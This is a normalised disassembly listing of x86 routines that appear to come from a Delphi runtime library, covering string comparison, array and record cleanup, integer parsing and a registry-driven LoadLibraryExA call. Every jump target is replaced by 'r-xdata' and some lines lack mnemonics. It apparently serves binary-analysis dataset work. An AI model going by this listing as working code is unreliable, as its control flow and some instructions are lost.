je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404820
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_4048a4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_404814
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_404794
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_4048f0
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_404698
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404680
mov ebx eax
mov eax [ edi ]
call sub_404814
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4029b0
mov eax esi
sub_404934
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404964
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404964
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404964
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404934
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402910
sub_404a04
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404a50
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404a50
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_403fc0
jmp r-xdata
call sub_403f9c
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_4046c0
jmp r-xdata
call sub_4046a8
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404a38
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404a50
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404a04
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_4059cc
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_405320
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402910
sub_404b60
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4029b0
mov edx [ eax + esi ]
add eax ebx
call sub_403ff0
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4046e4
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404b48
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4029b0
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404c7c
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404b60
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4059e4
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_40535c
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402910
sub_404c7c
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_403ff0
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4046e4
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404b48
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404c7c
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404b60
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4059e4
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_40535c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402910
sub_404da0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] ebx
mov eax [ esp ]
call sub_404814
mov edx eax
mov ecx esi
mov eax ebx
call sub_404d94
pop edx
pop esi
pop ebx
retn
sub_404dc4
push ebx
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
mov eax ebx
call sub_40425c
mov ecx eax
mov eax esp
mov edx ebx
call sub_404708
mov eax [ esp ]
pop edx
pop ebx
retn
sub_404df0
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404e14
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
mov al [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov al [ esi + ebp - 0x1 ]
call sub_4029f0
cmp al 0x58
je r-xdata
inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
jmp r-xdata
add dl 0xf9
sub dl 0x6
jb r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jae r-xdata
mov al [ esi + ebp ]
call sub_4029f0
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x37
jmp r-xdata
add dl 0xe6
sub dl 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
mov edi eax
and edi 0xff
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_404df0
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_405074
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_40506c
jmp r-xdata
mov al 0x4
call sub_402910
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402910
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_4027f4
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4027b4
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402c58
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404a50
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4029b0
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402c58
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_405054
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_405074
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_40520c
push ebx
test eax eax
je r-xdata
mov eax ecx
call sub_405320
pop ebx
retn
mov ebx eax
sub ebx 0x4
mov ebx [ ebx ]
push ebx
push ecx
xor ecx ecx
call sub_40522c
pop ebx
retn
sub_40522c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_40506c
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
test edi edi
jge r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x4
mov eax [ eax ]
cmp eax edi
jge r-xdata
add esi edi
xor edi edi
mov edx eax
sub edx edi
cmp esi edx
jle r-xdata
mov edi eax
test esi esi
jge r-xdata
mov esi edx
test esi esi
jle r-xdata
xor esi esi
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x1 ]
add [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x2 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x6 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax esi
imul [ ebp - 0xc ]
add eax 0x8
call sub_4027b4
mov ebx eax
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] esi
add ebx 0x4
imul edi [ ebp - 0xc ]
add [ ebp - 0x4 ] edi
test esi esi
jle r-xdata
mov ecx esi
imul ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4029b0
mov edx esi
imul edx [ ebp - 0xc ]
mov eax ebx
xor ecx ecx
call sub_402c58
push esi
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_405054
jmp r-xdata
sub_405320
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4027d4
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404a50
sub_40535c
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_405320
pop edx
pop eax
sub_405384
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4013c4
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_4053b4
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_401354
mov eax esp
mov dl 0x1
call sub_4055f0
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_4053fc
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_4053b4
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_405438
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_40135c
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_401364
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_405424
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_405424
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_405424
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call FindFirstFileA
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call FindClose
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_4055f0
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_401354
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4013ac
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4056f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_405438
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4013b4
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4013ac
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4013a4
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4013b4
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4013ac
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_401374
push eax
call sub_40134c
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_405890
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4027d4
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4027d4
jmp r-xdata
sub_4058f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_40592b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_40595c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4059c0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4058f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4059c7
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
